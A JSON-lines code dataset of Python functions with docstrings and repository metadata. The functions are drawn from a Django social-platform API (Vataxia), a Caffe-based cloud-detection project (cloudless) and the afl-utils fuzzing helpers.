{"docstring": "\"\"\"\nCreate invitation\n\"\"\"\n\n", "func_signal": "def post(request):\n", "code": "serializer = InvitationSerializerCreate(data=request.data, context={'request': request})\nif serializer.is_valid():\n    serializer.save()\n    wallet, _ = Wallet.objects.get_or_create(user=request.user)\n    wallet.balance -= 1\n    wallet.save()\n    return Response(InvitationSerializer(serializer.instance).data, status=status.HTTP_201_CREATED)\nreturn Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)", "path": "v1\\credits\\views\\invitation.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nFilter request query parameters\n\"\"\"\n\n", "func_signal": "def filter_query_params(allowed, query, request):\n", "code": "kwargs = {}\nfor param in allowed.keys() & request.query_params.keys():\n    try:\n        kwargs[param] = allowed[param](request.query_params[param])\n    except Exception as e:\n        return Response({constants.ERROR: {param: str(e)}}, status=status.HTTP_400_BAD_REQUEST)\nreturn query.filter(**kwargs)", "path": "v1\\filters\\common.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nDelete post reply\n\"\"\"\n\n", "func_signal": "def delete(request, post_reply_id):\n", "code": "post_reply = get_object_or_404(PostReply, pk=post_reply_id)\nif post_reply.user != request.user:\n    return Response(status=status.HTTP_401_UNAUTHORIZED)\npost_reply.delete()\nreturn Response(status=status.HTTP_204_NO_CONTENT)", "path": "v1\\replies\\views\\post_reply.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nView individual wallet\n\"\"\"\n\n", "func_signal": "def get(request, user_id):\n", "code": "user = get_object_or_404(User, pk=user_id)\nwallet, _ = Wallet.objects.get_or_create(user=user)\nreturn Response(WalletSerializer(wallet).data)", "path": "v1\\credits\\views\\wallet.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nCreate moderator\n\"\"\"\n\n", "func_signal": "def post(request):\n", "code": "serializer = ModeratorSerializerCreate(data=request.data, context={'request': request})\nif serializer.is_valid():\n    serializer.save()\n    return Response(ModeratorSerializer(serializer.instance).data, status=status.HTTP_201_CREATED)\nreturn Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)", "path": "v1\\user_roles\\views\\moderator.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nCreate post reply\n\"\"\"\n\n", "func_signal": "def post(request):\n", "code": "serializer = PostReplySerializerCreate(data=request.data, context={'request': request})\nif serializer.is_valid():\n    serializer.save()\n    return Response(PostReplySerializer(serializer.instance).data, status=status.HTTP_201_CREATED)\nreturn Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)", "path": "v1\\replies\\views\\post_reply.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nCreate user\n\"\"\"\n\n", "func_signal": "def post(request):\n", "code": "serializer = UserSerializerCreate(data=request.data, context={'request': request})\nif serializer.is_valid():\n    user = serializer.save()\n    user.set_password(serializer.validated_data['password'])\n    user.save()\n    Profile(user=user).save()\n    return Response(UserSerializer(user).data, status=status.HTTP_201_CREATED)\nreturn Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)", "path": "v1\\accounts\\views\\user.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nView individual user\n\"\"\"\n\n", "func_signal": "def get(request, user_id):\n", "code": "user = get_object_or_404(User, pk=user_id)\nreturn Response(UserSerializer(user).data)", "path": "v1\\accounts\\views\\user.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nList transfers\n\"\"\"\n\n", "func_signal": "def get(request):\n", "code": "transfers = Transfer.objects.all()\ntransfers = transfer_filter(request, transfers)\nif type(transfers) == Response:\n    return transfers\nreturn Response(TransferSerializer(transfers, many=True).data)", "path": "v1\\credits\\views\\transfer.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nList moderators\n\"\"\"\n\n", "func_signal": "def get(request):\n", "code": "moderators = Moderator.objects.all()\nreturn Response(ModeratorSerializer(moderators, many=True).data)", "path": "v1\\user_roles\\views\\moderator.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nDelete moderator\n\"\"\"\n\n", "func_signal": "def delete(request, moderator_id):\n", "code": "moderator = get_object_or_404(Moderator, pk=moderator_id)\nif not is_administrator(request.user):\n    return Response({\n        constants.ERROR: constants.PERMISSION_ADMINISTRATOR_REQUIRED\n    }, status=status.HTTP_403_FORBIDDEN)\nmoderator.delete()\nreturn Response(status=status.HTTP_204_NO_CONTENT)", "path": "v1\\user_roles\\views\\moderator.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nList invitations\n\"\"\"\n\n", "func_signal": "def get(request):\n", "code": "invitations = Invitation.objects.all()\ninvitations = invitation_filter(request, invitations)\nif type(invitations) == Response:\n    return invitations\nreturn Response(InvitationSerializer(invitations, many=True).data)", "path": "v1\\credits\\views\\invitation.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nList users\n\"\"\"\n\n", "func_signal": "def get(request):\n", "code": "users = User.objects.all()\nreturn Response(UserSerializer(users, many=True).data)", "path": "v1\\accounts\\views\\user.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nTest PEP8 conventions\n\"\"\"\n\n", "func_signal": "def test_style(self):\n", "code": "style = pycodestyle.StyleGuide(ignore=['E501'])\nresult = style.check_files(['config/', 'v1/'])\nself.assertEqual(result.total_errors, 0)", "path": "v1\\utils\\tests\\test_application.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nDelete user\n\"\"\"\n\n", "func_signal": "def delete(request, user_id):\n", "code": "user = get_object_or_404(User, pk=user_id)\nif is_administrator(user) or user.is_superuser:\n    return Response({\n        constants.ERROR: 'That user can not be deleted'\n    }, status=status.HTTP_401_UNAUTHORIZED)\nif is_moderator(user) and not is_administrator(request.user):\n    return Response({\n        constants.ERROR: 'Admin permissions needed to delete moderators'\n    }, status=status.HTTP_401_UNAUTHORIZED)\nif not is_moderator(request.user):\n    return Response({\n        constants.ERROR: 'Moderator permissions needed to delete users'\n    }, status=status.HTTP_401_UNAUTHORIZED)\nuser.delete()\nreturn Response(status=status.HTTP_204_NO_CONTENT)", "path": "v1\\accounts\\views\\user.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nReset password using reset password code\n\"\"\"\n\n", "func_signal": "def post(request):\n", "code": "code = request.data.get('code')\npassword = request.data.get('password')\n\ntry:\n    reset_password_code = get_object_or_404(ResetPasswordCode, code=code)\n    user = reset_password_code.user\n    validate_password(password)\n    user.set_password(password)\n    user.save()\n    reset_password_code.delete()\n    return Response({constants.SUCCESS: 'Password has been updated'})\nexcept KeyError:\n    return Response(status=status.HTTP_400_BAD_REQUEST)\nexcept ValidationError as error:\n    return Response({constants.ERROR: error}, status=status.HTTP_400_BAD_REQUEST)\nexcept ValueError:\n    return Response(status=status.HTTP_400_BAD_REQUEST)", "path": "v1\\accounts\\views\\reset_password.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nUpdate authenticated user\n\"\"\"\n\n", "func_signal": "def patch(request, user_id):\n", "code": "user = get_object_or_404(User, pk=user_id)\nif user != request.user:\n    return Response(status=status.HTTP_401_UNAUTHORIZED)\nserializer = UserSerializerUpdate(user, data=request.data, context={'request': request}, partial=True)\nif serializer.is_valid():\n    serializer.save()\n    return Response(UserSerializerLogin(serializer.instance).data)\nreturn Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)", "path": "v1\\accounts\\views\\user.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nUpdate password for authenticated user\n\"\"\"\n\n", "func_signal": "def post(request):\n", "code": "password = request.data.get('password')\n\ntry:\n    validate_password(password)\n    request.user.set_password(password)\n    request.user.save()\n    return Response({constants.SUCCESS: 'Password has been updated'})\nexcept KeyError:\n    return Response(status=status.HTTP_400_BAD_REQUEST)\nexcept TypeError:\n    return Response(status=status.HTTP_400_BAD_REQUEST)\nexcept ValidationError as e:\n    return Response({constants.ERROR: e}, status=status.HTTP_400_BAD_REQUEST)", "path": "v1\\accounts\\views\\update_password.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nCreate transfer\n\"\"\"\n\n", "func_signal": "def post(request):\n", "code": "serializer = TransferSerializerCreate(data=request.data, context={'request': request})\nif serializer.is_valid():\n    transfer = serializer.save()\n    sender_wallet, _ = Wallet.objects.get_or_create(user=transfer.sender)\n    receiver_wallet, _ = Wallet.objects.get_or_create(user=transfer.receiver)\n    sender_wallet.balance -= transfer.amount\n    receiver_wallet.balance += transfer.amount\n    sender_wallet.save()\n    receiver_wallet.save()\n    return Response(TransferSerializer(transfer).data, status=status.HTTP_201_CREATED)\nreturn Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)", "path": "v1\\credits\\views\\transfer.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nUpdate post reply\n\"\"\"\n\n", "func_signal": "def patch(request, post_reply_id):\n", "code": "post_reply = get_object_or_404(PostReply, pk=post_reply_id)\nserializer = PostReplySerializerUpdate(post_reply, data=request.data, context={'request': request}, partial=True)\nif serializer.is_valid():\n    serializer.save()\n    return Response(PostReplySerializer(serializer.instance).data)\nreturn Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)", "path": "v1\\replies\\views\\post_reply.py", "repo_name": "buckyroberts/Vataxia", "stars": 413, "license": "None", "language": "python", "size": 2841}
{"docstring": "\"\"\"\nRuns Caffe to train the model.\n\"\"\"\n", "func_signal": "def _run_trainer(caffe_home, log_path, output_log_file, solver, input_weight_file, note):\n", "code": "print(\"\\tRunning trainer...\")\nwith open(output_log_file, \"w\") as f:\n    process = subprocess.Popen([caffe_home + \"/build/tools/caffe\", \"train\",\n        \"--solver=\" + solver, \"--weights=\" + input_weight_file],\n        stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n\n    if note != None:\n        sys.stdout.write(\"Details for this training run: {}\\n\".format(note))\n\n    for line in iter(process.stdout.readline, ''):\n        sys.stdout.write(line)\n        f.write(line)\n\n    print(\"\\t\\tTraining output saved to %s\" % output_log_file)", "path": "src\\cloudless\\train\\train.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nReturns a dictionary of info about a random non-annotated image\n\"\"\"\n", "func_signal": "def random_img():\n", "code": "imgs = Image.objects.filter(annotation__isnull=True).order_by('?')\nif not imgs:\n    return JsonResponse({\n        'status': 'error',\n        'error': 'No images remain to annotate'\n    })\n\ni = imgs[0]\nreturn {\n    'status': 'ok',\n    'image_id': i.id,\n    'image_url': i.url()\n}", "path": "src\\annotate\\train\\views.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nMirrors the given images horizontally.\n\"\"\"\n", "func_signal": "def _mirror_images(process_me):\n", "code": "results = []\nfor orig_im in process_me:\n    results.append(orig_im)\n    results.append(ImageOps.mirror(orig_im))\nreturn results", "path": "src\\cloudless\\train\\prepare_data.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nGiven a raster, a chunk size, and a directory to write into...\nBreak the raster up into chunks of the appropriate size.\n\"\"\"\n", "func_signal": "def chunk(raster_filename, chunk_size=256, chunk_dir='/tmp/'):\n", "code": "CROP_CMD = 'gdal_translate -co ALPHA=YES -co PHOTOMETRIC=RGB -srcwin %s %s %s %s %s %s'\n# % (xoff, yoff, xsize, ysize, src, dst)\n\nbase = os.path.basename(os.path.splitext(raster_filename)[0])\n\nds = gdal.Open(raster_filename)\nnumPixelsWide, numPixelsHigh = ds.RasterXSize, ds.RasterYSize\nfor x in range(0, numPixelsWide-chunk_size-1, chunk_size):\n    for y in range(0, numPixelsHigh-chunk_size-1, chunk_size):\n        chunk_filename = os.path.join(\n            chunk_dir, '%s-%s-%s.tif' % (base, x, y)\n        )\n        os.system(CROP_CMD % (\n            x, y, chunk_size, chunk_size, raster_filename, chunk_filename\n        ))\n        yield chunk_filename", "path": "src\\annotate\\train\\scripts\\populate_db.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nGiven a caffe.io.load_image, returns the probability that it contains a cloud.\n\"\"\"\n\n", "func_signal": "def _predict_image(im, net, transformer):\n", "code": "net.blobs[\"data\"].data[...] = transformer.preprocess(\"data\", im)\nout = net.forward()\n\nprobs = out[\"prob\"][0]\nprob_cloud = probs[1] * 100.0\nreturn prob_cloud", "path": "src\\cloudless\\train\\predict.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nDetects if this chunked image is incomplete in some way, such as if it was near\nthe edge of the cropped image ending up with incomplete white areas.\n\"\"\"\n# HACK(neuberg): If we detect pixels with full transparency we know\n# that this chunk has incomplete areas on it.\n", "func_signal": "def incomplete_image(chunk_img):\n", "code": "pixels = np.array(chunk_img)\nfor channel in pixels:\n    for pixel in channel:\n        if pixel[3] == 0:\n            return True\nreturn False", "path": "src\\annotate\\train\\scripts\\populate_db.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nParses our training and validation logs produced from a Caffe training run in order to return\nthem in a way we can work with.\n\"\"\"\n", "func_signal": "def parse_logs(log_path, output_log_file):\n", "code": "training_iters = []\ntraining_loss = []\ntraining_accuracy = []\nfor line in csv.reader(open(output_log_file + \".train\"), delimiter=\"\\t\", skipinitialspace=True):\n    if re.search(\"Iters\", str(line)):\n        continue\n\n    training_iters.append(int(float(line[0])))\n    training_accuracy.append(float(line[3]))\n    training_loss.append(float(line[4]))\n\nvalidation_iters = []\nvalidation_loss = []\nvalidation_accuracy = []\nfor line in csv.reader(open(output_log_file + \".validate\"), delimiter=\"\\t\",\n                        skipinitialspace=True):\n    if re.search(\"Iters\", str(line)):\n        continue\n\n    validation_iters.append(int(float(line[0])))\n    validation_accuracy.append(float(line[3]))\n    validation_loss.append(float(line[4]))\n\nreturn (\n    {\n        \"iters\": training_iters,\n        \"loss\": training_loss,\n        \"accuracy\": training_accuracy\n    }, {\n        \"iters\": validation_iters,\n        \"loss\": validation_loss,\n        \"accuracy\": validation_accuracy\n    }\n)", "path": "src\\cloudless\\train\\utils.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nGenerates path information on to where to put our log files.\n\"\"\"\n", "func_signal": "def get_log_path_details(log_path, log_num):\n", "code": "output_ending = \"%04d\" % (log_num)\noutput_log_prefix = os.path.join(log_path, \"output\" + output_ending)\noutput_log_file = output_log_prefix + \".log\"\nreturn (output_ending, output_log_prefix, output_log_file)", "path": "src\\cloudless\\train\\utils.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nParse out some of the values we need from the Caffe solver prototext file.\n\"\"\"\n", "func_signal": "def _get_hyperparameter_details(note, solver):\n", "code": "solver = open(solver, \"r\")\ndetails = solver.read()\nlr = re.search(\"^base_lr:\\s*([0-9.]+)$\", details, re.MULTILINE).group(1)\nmax_iter = re.search(\"^max_iter:\\s*([0-9.]+)$\", details, re.MULTILINE).group(1)\nresults = \"(lr: %s; max_iter: %s\" % (lr, max_iter)\n\n# Add any extra details into the graph if someone specified that on the command line.\nif note:\n    results += \"; %s\" % note\nresults += \")\"\nreturn results", "path": "src\\cloudless\\train\\test.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nTake all the annotated images, copy them to the specified directory,\nand write out annotated.json with the annotation for each image.\n\"\"\"\n", "func_signal": "def export(dirname):\n", "code": "Image = apps.get_model('train', 'Image')\nannotated = Image.objects.filter(annotation__isnull=False)\ndata = []\nfor i in annotated:\n    base = os.path.basename(i.path)\n    # copy image to directory\n    shutil.copy(i.path, os.path.join(dirname, base))\n    # add bounding boxes to JSON\n    data.append({\n        'image_name': base,\n        'image_annotation': i.annotation\n    })\n\nwith open(os.path.join(dirname, 'annotated.json'), 'w') as f:\n    json.dump(data, f)\n\nreturn annotated.count()", "path": "src\\annotate\\train\\scripts\\export.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nTurns one of our testing image paths into an actual image, converted into a numpy array.\n\"\"\"\n", "func_signal": "def _load_numpy_image(image_path, width, height):\n", "code": "im = Image.open(image_path)\n# Scale the image to the size required by our neural network.\nim = im.resize((width, height))\ndata = np.asarray(im)\ndata = np.reshape(data, (3, height, width))\nreturn data", "path": "src\\cloudless\\train\\prepare_data.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nConverts a geotiff to a PNG in the same directory\n\"\"\"\n", "func_signal": "def convert(chunk_img, filename):\n", "code": "new_f = os.path.join(\n    os.path.dirname(filename),\n    os.path.basename(filename).replace('.tif', '.png')\n)\nchunk_img.save(new_f)\nreturn new_f", "path": "src\\annotate\\train\\scripts\\populate_db.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nCrops an image into its four corners and its center, adding them to process_me.\n\"\"\"\n", "func_signal": "def _crop_image(im, width, height, process_me):\n", "code": "process_me.append(im.crop((0, 0, width / 2, height / 2)))\nprocess_me.append(im.crop((width / 2, 0, width, height / 2)))\nprocess_me.append(im.crop((0, height / 2, width / 2, height)))\nprocess_me.append(im.crop((width / 2, height / 2, width, height)))\n\n# Crop the center.\ncenter_width = width / 2\ncenter_height = height / 2\ncenter_left = (width - center_width) / 2\ncenter_top = (height - center_height) / 2\ncenter_right = (width + center_width) / 2\ncenter_bottom = (height + center_height) / 2\nprocess_me.append(im.crop((center_left, center_top, center_right, center_bottom)))", "path": "src\\cloudless\\train\\prepare_data.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nRotates the images given in process_me by all four possible 90 degrees.\n\"\"\"\n", "func_signal": "def _rotate_images(process_me):\n", "code": "results = []\nfor orig_im in process_me:\n    results.append(orig_im)\n    rotated_im = orig_im\n    for i in range(3):\n        rotated_im = rotated_im.rotate(90)\n        results.append(rotated_im)\nreturn results", "path": "src\\cloudless\\train\\prepare_data.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nTakes the raw Caffe output created while training the model in order\nto generate reduced statistics, such as giving iterations vs. test loss.\n\"\"\"\n\n", "func_signal": "def _generate_parsed_logs(caffe_home, log_path, output_log_file):\n", "code": "print(\"\\tParsing logs...\")\nprocess = subprocess.Popen([caffe_home + \"/tools/extra/parse_log.py\",\n    output_log_file, log_path], stdout=subprocess.PIPE,\n    stderr=subprocess.STDOUT)\nfor line in iter(process.stdout.readline, ''):\n    sys.stdout.write(line)\n\nshutil.rmtree(output_log_file + \".validate\", ignore_errors=True)\nshutil.move(output_log_file + \".test\", output_log_file + \".validate\")\n\n# Convert the commas in the files into tabs to make them easier to read.\nlog_files = [output_log_file + \".train\", output_log_file + \".validate\"]\nfor line in fileinput.input(log_files, inplace=True):\n    line = line.replace(u\",\", u\"\\t\")\n    if fileinput.isfirstline():\n        # HACK(neuberg): The column headers with tabs don't quite line up, so shorten\n        # some column names and add a tab.\n        line = line.replace(u\"NumIters\", u\"Iters\")\n        line = line.replace(u\"LearningRate\", u\"\\tLR\")\n\n    sys.stdout.write(line)\nfileinput.close()\n\nlogs = [\n    {\"title\": \"Testing\", \"filename\": \"train\"},\n    {\"title\": \"Validation\", \"filename\": \"validate\"}\n]\nfor log in logs:\n    print(\"\\n\\t\\tParsed %s log:\" % log[\"title\"])\n    with open(output_log_file + \".\" + log[\"filename\"], \"r\") as f:\n        lines = f.read().split(\"\\n\")\n        for line in lines:\n            print(\"\\t\\t\\t%s\" % line)\n\nprint(\"\\t\\tParsed training log saved to %s\" % (output_log_file + \".train\"))\nprint(\"\\t\\tParsed validation log saved to %s\\n\" % (output_log_file + \".validate\"))", "path": "src\\cloudless\\train\\train.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\" Classifies our region proposals. \"\"\"\n", "func_signal": "def classify(images, config, weights):\n", "code": "print(\"Classifying: %d region images\" % len(images))\n\nassert(os.path.isfile(config) and os.path.isfile(weights))\n\n# Caffe swaps RGB channels\nchannel_swap = [2, 1, 0]\n\n# TODO: resizing on incoming config to make batching more efficient, predict\n# loops over each image, slow\n# Make classifier.\nclassifier = caffe.Classifier(config,\n                              weights,\n                              raw_scale=255,\n                              channel_swap=channel_swap,\n                             )\n\n# Classify.\nreturn classifier.predict(images, oversample=False)", "path": "src\\cloudless\\inference\\localization.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nGenerates training/validation graphs.\n\"\"\"\n\n", "func_signal": "def plot_results(training_details, validation_details, note, output_graph_path, solver):\n", "code": "_plot_loss(training_details, validation_details, note, output_graph_path, solver)\n_plot_accuracy(training_details, validation_details, note, output_graph_path, solver)", "path": "src\\cloudless\\train\\test.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nTakes expected and actual target values, generating true and false positives and negatives,\nincluding the actual correct # of positive and negative values.\n\"\"\"\n\n", "func_signal": "def _calculate_positives_negatives(target_details):\n", "code": "true_positive = 0\ntrue_negative = 0\nfalse_negative = 0\nfalse_positive = 0\nactual_positive = 0\nactual_negative = 0\nfor idx in range(len(target_details)):\n    predicted_target = target_details[idx][\"predicted_target\"]\n    expected_target = target_details[idx][\"expected_target\"]\n\n    if expected_target == 1:\n        actual_positive = actual_positive + 1\n    else:\n        actual_negative = actual_negative + 1\n\n    if predicted_target == 1 and expected_target == 1:\n        true_positive = true_positive + 1\n    elif predicted_target == 0 and expected_target == 0:\n        true_negative = true_negative + 1\n    elif predicted_target == 1 and expected_target == 0:\n        false_positive = false_positive + 1\n    elif predicted_target == 0 and expected_target == 1:\n        false_negative = false_negative + 1\n\nreturn {\n    \"true_positive\": float(true_positive),\n    \"false_positive\": float(false_positive),\n    \"actual_positive\": float(actual_positive),\n\n    \"true_negative\": float(true_negative),\n    \"false_negative\": float(false_negative),\n    \"actual_negative\": float(actual_negative),\n}", "path": "src\\cloudless\\train\\predict.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nParses out the file name of the model weight file we just trained.\n\"\"\"\n", "func_signal": "def _get_trained_weight_file(log_path, output_log_file):\n", "code": "trained_weight_file = None\nwith open(output_log_file) as f:\n    content = f.read()\n    # Note: not all versions of Caffe include the phrase 'binary proto file ' in the log output.\n    trained_weight_file = re.findall(\"Snapshotting to (?:binary proto file )?(.*)$\", content,\n            re.MULTILINE)[-1]\n\nreturn trained_weight_file", "path": "src\\cloudless\\train\\train.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "\"\"\"\nFilters predictions down to just those that are above or equal to a certain threshold, with\na max number of results controlled by 'max_regions'.\n\"\"\"\n", "func_signal": "def filter_predictions(predictions, max_regions, threshold):\n", "code": "results = [entry for entry in predictions if entry[\"prob\"] >= threshold]\nresults = results[0:max_regions]\nreturn results", "path": "src\\cloudless\\inference\\localization.py", "repo_name": "BradNeuberg/cloudless", "stars": 297, "license": "apache-2.0", "language": "python", "size": 5768}
{"docstring": "# Use for clean up after tests have run\n", "func_signal": "def tearDown(self):\n", "code": "self.clean_remove_dir('testdata/rsync_tmp_store')\nself.clean_remove_dir('testdata/sync/fuzz000/crashes')\nself.clean_remove_dir('testdata/sync/fuzz000/hangs')\nself.clean_remove_dir('testdata/sync/fuzz000/.cur_input')\nself.clean_remove_dir('testdata/sync/fuzz001/.cur_input')\nself.clean_remove_dir('testdata/sync/fuzz002.sync')\nself.clean_remove_dir('testdata/sync/invalid_fuzz000')\nself.clean_remove_dir('testdata/sync/invalid_fuzz001')\nself.clean_remove_dir('testdata/sync/fuzz000.sync')\nself.clean_remove_dir('testdata/sync/fuzz001.sync')\nself.clean_remove_dir('testdata/sync/other_fuzz000.sync')\nself.clean_remove_dir('testdata/sync/other_fuzz001.sync')\nself.clean_remove_dir('testdata/sync/other_invalid_fuzz000.sync')\nself.clean_remove_dir('testdata/rsync_output_push')\nself.clean_remove_dir('testdata/rsync_output_pull')\nself.clean_remove_dir('testdata/rsync_output_sync')\nself.clean_remove_dir('testdata/new_sync')", "path": "tests\\test_afl_sync.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# Use to set up test environment prior to test case\n# invocation\n\n", "func_signal": "def setUp(self):\n", "code": "os.makedirs('testdata/auto_delay_sync', exist_ok=True)\nos.makedirs('testdata/auto_delay_sync/fuzz000', exist_ok=True)\nos.makedirs('testdata/auto_delay_sync/fuzz000/queue', exist_ok=True)\nos.makedirs('testdata/auto_delay_sync/fuzz000/queue/sample0', exist_ok=True)\nos.makedirs('testdata/auto_delay_sync/fuzz000/queue/sample1', exist_ok=True)\nos.makedirs('testdata/auto_delay_sync/fuzz000/queue/sample2', exist_ok=True)", "path": "tests\\test_afl_multicore.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# Use for clean up after tests have run\n", "func_signal": "def tearDown(self):\n", "code": "self.clean_remove_dir('testdata/sync/fuzz000/crashes')\nself.clean_remove_dir('testdata/sync/fuzz001/crashes')\nself.clean_remove_dir('testdata/sync/fuzz000/queue')\nself.clean_remove_dir('testdata/sync/fuzz001/queue')\nself.clean_remove_dir('testdata/output')\nself.clean_remove_dir('testdata/test_collection_dir')\nself.clean_remove('testdata/read_only')\nself.clean_remove('testdata/dbfile.db')\nself.clean_remove('testdata/gdbscript')\nself.clean_remove_dir('testdata/crash_process/bin')\nos.chmod('testdata/read_only_file', 0o744)\nself.clean_remove('testdata/read_only_file')\nself.clean_remove('testdata/gdb_script')\nself.clean_remove('testdata/gdb_script.0')", "path": "tests\\test_afl_collect.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# Use for clean up after tests have run\n", "func_signal": "def tearDown(self):\n", "code": "self.clean_remove('/tmp/afl_multicore.PGID.unittest_sess_01')\nself.clean_remove_dir('testdata/auto_delay_sync')", "path": "tests\\test_afl_multicore.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
{"docstring": "# Worst case startup time (t_sw) per fuzzer (N - number of samples, T - max. timeout):\n#   t_sw = N * T\n# Optimized case startup time (t_sa) per fuzzer (O - optimization factor):\n#   t_sa = O * t_sw = O * N * T\n# Educated guess for some O:\n#    O = 1 / sqrt(N)\n# This might need some tuning!\n", "func_signal": "def auto_startup_delay(config_settings, instance_num, resume=True):\n", "code": "if resume:\n    instance_dir = os.path.join(config_settings[\"output\"], \"{}{:03d}\".format(config_settings[\"session\"], instance_num),\n                                \"queue\")\nelse:\n    instance_dir = config_settings[\"input\"]\nsample_list = os.listdir(instance_dir)\nN = len(sample_list)\nT = float(config_settings[\"timeout\"].strip(\" +\")) if \"timeout\" in config_settings else 1000.0\nO = N**(-1/2)\n\nreturn O * T * N / 1000", "path": "afl_utils\\afl_multicore.py", "repo_name": "rc0r/afl-utils", "stars": 402, "license": "apache-2.0", "language": "python", "size": 755}
